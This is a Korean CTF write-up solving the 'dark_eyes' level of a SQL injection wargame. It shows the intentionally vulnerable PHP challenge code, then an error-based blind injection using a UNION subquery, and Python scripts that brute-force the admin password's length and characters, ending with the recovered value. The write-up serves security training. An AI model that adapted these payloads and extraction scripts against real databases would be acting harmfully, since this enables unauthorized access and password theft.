# dark_eyes

## 1. Code
```php
<?php
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
  highlight_file(__FILE__);
?>
```

## 2. Condition
- `col if case when sleep benchmark`를 필터링한다.
- 에러 발생시, 빈화면을 리다이렉트 시킨다.   

## 3. Solution
먼저 공격 쿼리를 설계해 보았다.   

변수명 | 값
---|---
`pw` | 1234' or (SELECT 1 UNION SELECT `조건문`)#   

`UNION`을 이용할것인데, 참과 거짓을 나누는 원리는 다음과 같다.   

참 : 서브 쿼리속 조건문이 참 일 경우, `UNION`에 의해 1만이 전달된다(참 == 1).   
거짓 : 거짓일 경우, 1와 거짓이 `UNION`되어, 두개의 rows를 반환시킨다. &rarr; 오류가 발생한다.   



#### a. 길이 구하기
>    `length`함수를 이용하여 길이를 구하였다.   

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,101):
    url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?\
            pw=1234' or id='admin' and (SELECT 1 UNION SELECT length(pw)=%d)%%23" % i
    res = requests.get(url, cookies=cookie)
    
    if not (res.text == ""):
        pw_len = i
        print("Length of pw : %d" % i)
        break
```   

>    실행 결과는 다음과 같다.   

```
Length of pw : 8
```   


#### b. 값 구하기
>    `ascii`와 `substr`함수를 이용하였다.
    `a. 길이 구하기`의 코드 뒤에 붙여 주었다.   
    
```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,101):
    url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?\
            pw=1234' or id='admin' and (SELECT 1 UNION SELECT length(pw)=%d)%%23" % i
    res = requests.get(url, cookies=cookie)
    
    if not (res.text == ""):
        pw_len = i
        print("Length of pw : %d" % i)
        break
        
pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?\
            pw=1234' or id='admin' and (SELECT 1 UNION SELECT ascii(substr(pw,%d,1))=%d)%%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
```   

>    실행 결과는 다음과 같다.   

```
Length of pw : 8
pw(1) : 5
pw(2) : 5a
pw(3) : 5a2
pw(4) : 5a2f
pw(5) : 5a2f5
pw(6) : 5a2f5d
pw(7) : 5a2f5d3
pw(8) : 5a2f5d3c
```   

나온 pw 값을 최종적으로 대입해 보면 문제가 해결된다.   
변수명 | 값
---|---
`pw` | 5a2f5d3c